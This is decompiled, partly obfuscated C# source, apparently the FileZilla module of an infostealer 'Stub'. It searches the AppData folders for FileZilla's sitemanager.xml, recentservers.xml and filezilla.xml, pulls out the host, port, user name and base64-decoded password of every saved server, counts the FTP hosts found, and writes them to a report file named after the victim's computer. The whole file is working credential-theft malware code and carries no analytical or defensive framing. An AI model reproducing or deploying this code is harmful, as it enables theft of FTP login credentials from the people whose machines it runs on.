using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000040 RID: 64
	public static class FileZilla
	{
		// Token: 0x0600012F RID: 303 RVA: 0x0000D678 File Offset: 0x0000B878
		static FileZilla()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			string[] array = new string[] { "sitemanager.xml", "recentservers.xml", "filezilla.xml" };
			string[] array2 = new string[]
			{
				Paths.localAppData,
				Paths.roamingAppData,
				Paths.commonAppdata
			};
			FileZilla.possiblePaths = new string[array.Length * array2.Length];
			for (int i = 0; i < array2.Length; i++)
			{
				for (int j = 0; j < array.Length; j++)
				{
					FileZilla.possiblePaths[i * array.Length + j] = Path.Combine(array2[i], "FileZilla", array[j]);
				}
			}
		}

		// Token: 0x06000130 RID: 304 RVA: 0x0000D71C File Offset: 0x0000B91C
		public static DataExtractionStructs.FileZillaInfo[] GetInfo()
		{
			List<DataExtractionStructs.FileZillaInfo> list = new List<DataExtractionStructs.FileZillaInfo>();
			foreach (string text in FileZilla.possiblePaths)
			{
				if (File.Exists(text))
				{
					string text2 = Utils.ForceReadFileString(text, false);
					if (text2 != null)
					{
						XmlDocument xmlDocument = new XmlDocument();
						try
						{
							xmlDocument.LoadXml(text2);
						}
						catch
						{
							goto IL_020C;
						}
						foreach (object obj in xmlDocument.GetElementsByTagName("Server"))
						{
							XmlNode xmlNode = (XmlNode)obj;
							if (xmlNode.HasChildNodes)
							{
								string text3 = null;
								int maxValue = int.MaxValue;
								string text4 = null;
								string text5 = null;
								foreach (object obj2 in xmlNode.ChildNodes)
								{
									XmlNode xmlNode2 = (XmlNode)obj2;
									if (xmlNode2.Name == "Host")
									{
										text3 = xmlNode2.InnerText;
									}
									else if (xmlNode2.Name == "Port")
									{
										int.TryParse(xmlNode2.InnerText, out maxValue);
									}
									else if (xmlNode2.Name == "User")
									{
										text4 = xmlNode2.InnerText;
									}
									else if (xmlNode2.Name == "Pass")
									{
										XmlNode xmlNode3 = xmlNode2.Attributes.Item(0);
										if (xmlNode3 != null && !(xmlNode3.Name != "encoding") && !(xmlNode3.Value != "base64"))
										{
											try
											{
												text5 = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode2.InnerText));
											}
											catch
											{
											}
										}
									}
								}
								if (text3 != null && maxValue < 32767 && text4 != null && text5 != null)
								{
									list.Add(new DataExtractionStructs.FileZillaInfo(text3, maxValue, text4, text5));
									Counter.FtpHosts++;
								}
							}
						}
					}
				}
				IL_020C:;
			}
			return list.ToArray();
		}

		// Token: 0x06000131 RID: 305 RVA: 0x0000D9AC File Offset: 0x0000BBAC
		public static void SaveFileZillaCredentials()
		{
			try
			{
				string text = DateTime.Now.ToString("yyyy-MM-dd_HH.mm.ss");
				string compname = SystemInfo.Compname;
				DataExtractionStructs.FileZillaInfo[] info = FileZilla.GetInfo();
				string text2 = Path.Combine(Paths.InitWorkDir(), string.Concat(new string[] { "FileZilla_", compname, "_", text, ".txt" }));
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.AppendLine(string.Format("FileZilla Credentials Report - {0}", DateTime.Now));
				stringBuilder.AppendLine("==========================================");
				stringBuilder.AppendLine();
				if (info.Length == 0)
				{
					stringBuilder.AppendLine("No FileZilla credentials were found.");
				}
				else
				{
					stringBuilder.AppendLine(string.Format("Found {0} saved FTP server(s):", info.Length));
					stringBuilder.AppendLine();
					foreach (DataExtractionStructs.FileZillaInfo fileZillaInfo in info)
					{
						stringBuilder.AppendLine(fileZillaInfo.ToString());
						stringBuilder.AppendLine("------------------------------------------");
					}
				}
				File.WriteAllText(text2, stringBuilder.ToString());
				Logging.Log("FileZilla credentials saved to: " + text2, true);
			}
			catch (Exception ex)
			{
				Logging.Log("Error saving FileZilla credentials: " + ex.Message, true);
			}
		}

		// Token: 0x04000152 RID: 338
		private static string[] possiblePaths;
	}
}
